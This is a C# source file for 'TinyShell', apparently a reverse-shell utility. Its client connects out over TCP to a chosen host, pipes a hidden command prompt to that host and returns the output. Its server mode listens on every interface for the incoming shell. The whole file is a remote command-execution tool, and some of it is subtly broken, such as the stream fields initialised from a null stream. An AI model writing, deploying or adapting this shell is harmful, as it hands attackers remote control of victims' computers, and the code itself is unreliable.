using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using System.Diagnostics;
using BytecodeApi.IO.Interop;
using System.Threading;

namespace TinyShell
{
    class Program
    {
        static string host = "";
        static string port = "0";
        static void Main(string[] args)
        {
            if(args.Length > 0) {
                if (args.Length == 2)
                {
                    if (args[0].ToLower() == "--server") { Server(args[1]); }
                    else
                    {
                        Shell(args[0], args[1]);
                    }
                }
                else
                {
                    if (args[0].ToLower() == "--server") { Server(args[1]); }
                    else
                    {
                        Shell(host, port);
                    }
                }
            } else {
                Shell(host, port);
            }
        }
        static void WriteMe()
        {
            while(cli.Connected)
            {
                string ah = Console.ReadLine();
                writey.WriteLine(ah);
            }
        }
        private static void GetInputAsync()
        {
            Task.Run(WriteMe);
        }
        static bool GetElev()
        {
            if(Process.GetCurrentProcess().GetIntegrityLevel() == ProcessIntegrityLevel.High || Process.GetCurrentProcess().GetIntegrityLevel() == ProcessIntegrityLevel.System) { return true; }
            return false;
        }
        static void Server(string port)
        {
            ProcessEx.CreateConsole(false, true);
            if (GetElev() == false) { Console.WriteLine("[ERROR] This operation requires elevation."); Environment.Exit(1); }
            TcpListener server = new TcpListener(IPAddress.Any ,Convert.ToInt32(port));
            server.Start();
            Console.Write("Awaiting connection");
            while (!server.Pending()) { Thread.Sleep(1000); Console.Write("."); }
            cli = server.AcceptTcpClient();
            Console.Write(" Connection recieved!\n");
            stre = cli.GetStream();
            GetInputAsync();
            while(cli.Connected)
            {
                if (stre.DataAvailable)
                {
                    Console.WriteLine(readey.ReadLine());
                }
            }
            
        }
        public static TcpClient cli = null;
        public static NetworkStream stre = null;
        public static StreamWriter writey = new StreamWriter(stre);
        public static StreamReader readey = new StreamReader(stre);
        static void Shell(string host, string port)
        {
            cli = new TcpClient(host, Convert.ToInt32(port));
            var ah = new CommandPrompt();
            ah.MessageReceived += new EventHandler<CommandPromptEventArgs>(OnMessageReceived);
            ah.Start();
            while (true) { if (cli.Connected) { stre = cli.GetStream(); break; } }
            while (true)
            {
                if(cli.Connected) {
                    
                    if(ah.Running)
                    {
                        if (stre.DataAvailable)
                        {
                            string content = readey.ReadLine();
                            if (content.ToLower().StartsWith("tinyshellcustom:"))
                            {
                                ah.WriteLine(Proc((content.Split(':'))[1]));

                            } else
                            {
                                ah.WriteLine(content);
                            }
                            
                        }
                    }
                }
            }
            
        }
        static string Proc(string com)
        {
            if(com.ToLower() == "help") { return "No. Sorry."; }
            return "Unknown custom command";
        }
        protected static void OnMessageReceived(object sender, CommandPromptEventArgs e)
        {
            if(e.IsError) { string sendstring = "[ERROR] " + e.Message; writey.WriteLine(sendstring); } else { string sendstring = e.Message; writey.WriteLine(sendstring); }
        }
    }
}
